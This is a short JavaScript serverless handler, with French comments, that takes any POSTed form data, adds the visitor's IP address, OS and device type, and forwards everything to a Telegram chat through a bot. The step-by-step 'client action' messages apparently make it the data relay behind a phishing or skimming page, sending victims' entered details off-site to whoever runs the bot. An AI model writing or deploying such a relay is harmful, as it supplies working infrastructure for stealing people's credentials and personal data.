// api/tg.js
import fetch from 'node-fetch';

// Récupère token et chat id depuis les env
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Helper pour détecter l’OS et le device type depuis le user-agent
function parseUA(ua) {
  const isAndroid = /Android/i.test(ua);
  const isIPhone  = /iPhone/i.test(ua);
  const isWindows = /Windows NT/i.test(ua);
  const isMac     = /Macintosh/i.test(ua);
  let os = 'Inconnu';
  if (isAndroid) os = 'Android';
  else if (isIPhone) os = 'iPhone';
  else if (isWindows) os = 'Windows';
  else if (isMac) os = 'Mac OS';
  const device = isAndroid||isIPhone ? 'Mobile' : 'Desktop';
  return { os, device };
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).end('Method Not Allowed');
  }

  // On extrait IP, UA, body
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const { os, device } = parseUA(ua);

  const data = req.body;       // doit être un objet JSON
  const when = new Date().toLocaleString('fr-FR');

  // Construit le message Telegram
  let text = `🆕 *Nouvelle action client* \n`;
  text += `\`${when}\` depuis _${ip}_ (${device}/${os})\n\n`;
  // On affiche le type d’étape et les données reçues
  text += `*Étape* : ${data.step}\n`;
  // Pour chaque champ du body on l’ajoute
  for (const [key, val] of Object.entries(data)) {
    if (key === 'step') continue;
    text += `• *${key}* : ${val}\n`;
  }

  // Envoi à Telegram
  try {
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: 'Markdown',
        text
      })
    });
    res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Telegram error:', err);
    res.status(500).json({ error: 'Telegram send failed' });
  }
}